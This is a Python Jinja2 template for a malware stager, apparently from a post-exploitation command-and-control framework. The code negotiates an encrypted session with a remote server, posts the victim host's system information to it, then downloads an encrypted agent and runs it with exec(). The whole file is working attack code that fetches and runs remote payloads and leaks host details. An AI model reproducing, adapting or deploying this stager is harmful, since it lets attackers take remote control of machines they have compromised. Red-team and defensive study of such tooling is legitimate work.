#!/usr/bin/env python

"""
This file is a Jinja2 template.
    Variables:
        working_hours
        kill_date
        staging_key
        profile
        stage_1
        stage_2
"""

import random
import string
import urllib2

{% include 'common/rc4.py' %}
{% include 'common/aes.py' %}
{% include 'common/diffiehellman.py' %}
{% include 'common/get_sysinfo.py' %}

def post_message(uri, data):
    global headers
    return (urllib2.urlopen(urllib2.Request(uri, data, headers))).read()

# generate a randomized sessionID
sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(8))

# server configuration information
stagingKey = '{{ staging_key }}'
profile = '{{ profile }}'
WorkingHours = '{{ working_hours }}'
KillDate = '{{ kill_date }}'

parts = profile.split('|')
taskURIs = parts[0].split(',')
userAgent = parts[1]
headersRaw = parts[2:]

# global header dictionary
#   sessionID is set by stager.py
# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" % (sessionID)}
headers = {'User-Agent': userAgent}

# parse the headers into the global header dictionary
for headerRaw in headersRaw:
    try:
        headerKey = headerRaw.split(":")[0]
        headerValue = headerRaw.split(":")[1]
        if headerKey.lower() == "cookie":
            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
        else:
            headers[headerKey] = headerValue
    except:
        pass

# stage 3 of negotiation -> client generates DH key, and POSTs HMAC(AESn(PUBc)) back to server
clientPub = DiffieHellman()
hmacData = aes_encrypt_then_hmac(stagingKey, str(clientPub.publicKey))

# RC4 routing packet:
#   meta = STAGE1 (2)
routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=2, encData=hmacData)

try:
    postURI = server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
    # response = post_message(postURI, routingPacket+hmacData)
    response = post_message(postURI, routingPacket)
except:
    exit()

# decrypt the server's public key and the server nonce
packet = aes_decrypt_and_verify(stagingKey, response)
nonce = packet[0:16]
serverPub = int(packet[16:])

# calculate the shared secret
clientPub.genKey(serverPub)
key = clientPub.key

# step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
postURI = server + "{{ stage_2 | default('/index.php', true) | ensureleadingslash}}"
hmacData = aes_encrypt_then_hmac(clientPub.key, get_sysinfo(nonce=str(int(nonce)+1)))

# RC4 routing packet:
#   sessionID = sessionID
#   language = PYTHON (2)
#   meta = STAGE2 (3)
#   extra = 0
#   length = len(length)
routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=3, encData=hmacData)

response = post_message(postURI, routingPacket)

# step 6 -> server sends HMAC(AES)
agent = aes_decrypt_and_verify(key, response)
agent = agent.replace('REPLACE_WORKINGHOURS', WorkingHours)
agent = agent.replace('REPLACE_KILLDATE', KillDate)
exec(agent)
